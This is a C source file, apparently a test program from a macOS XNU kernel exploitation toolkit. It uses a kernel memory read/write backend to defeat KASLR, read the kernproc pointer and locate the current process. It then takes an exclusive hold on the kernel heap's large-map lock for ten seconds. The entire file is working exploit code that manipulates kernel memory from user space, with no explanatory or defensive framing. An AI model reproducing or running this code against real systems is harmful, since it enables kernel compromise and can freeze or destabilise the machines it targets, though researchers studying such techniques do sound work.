//
//  main.c
//  locker
//
//  Created by admin on 11/25/21.
//

#include <assert.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/errno.h>
#include <gym_client.h>

#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include "kmem.h"
#include "kmem_gym.h"
#include "slider.h"
#include "platform_types.h"
#include "platform_variables.h"
#include "allocator_msdosfs.h"

#include "xnu_proc.h"
#include "util_lck_rw.h"


int main(void) {
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    uintptr_t proc = xe_xnu_proc_current_proc(kernproc);

    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kh_large_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
    uintptr_t lck_rw = KMEM_OFFSET(kh_large_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
    printf("[INFO] attempt locking %p\n", (void*)lck_rw);
    
    xe_util_lck_rw_t util_lock = xe_util_lck_rw_lock_exclusive(proc, lck_rw);
    sleep(10);
    xe_util_lck_rw_lock_done(&util_lock);
    printf("done\n");
    
    return 0;
}
